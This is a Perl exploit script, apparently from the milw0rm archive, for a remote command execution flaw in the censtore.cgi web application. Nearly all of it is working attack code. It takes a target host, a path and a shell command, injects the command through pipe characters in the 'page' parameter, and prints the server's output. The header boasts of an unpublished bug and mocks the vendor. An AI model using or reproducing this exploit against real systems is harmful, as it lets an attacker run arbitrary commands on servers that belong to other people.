#!/usr/bin/perl
#
#  Censtore.cgi exploit by FOX_MULDER (fox_mulder@abv.bg)
#
#  Vulnerability foud by FOX_MULDER.
#
#  This is the first exploit i release and the bug is not public so enjoy.
#  Ask http://censtore.com/ what they think about it !!!  
#
###########################

use IO::Socket;
use LWP::Simple; 

sub Usage {
print STDERR "\nFOX_MULDER DID IT AGAIN !!!\n";
print STDERR "Usage:\ncenex.pl <www.example.com> </path/> \"cmd\"\n";
exit;
}

if (@ARGV < 3)
{
 Usage();
}


$host = @ARGV[0];
$path = @ARGV[1];
$command = @ARGV[2];
print "\n\n !!! ULTRA PRIVATE EDITION !!! \n\n";
print "censtore.cgi Remote Command Execution Exploit by FOX_MULDER\n";

print "\n[+] Conecting to $host\n";

my $result = get("http://$host$path/censtore.cgi?page=|$command|"); 

if (defined $result) { 
print $result; 
} 
else { 
print "Error with request.\n"; 
}

# milw0rm.com [2006-04-13]
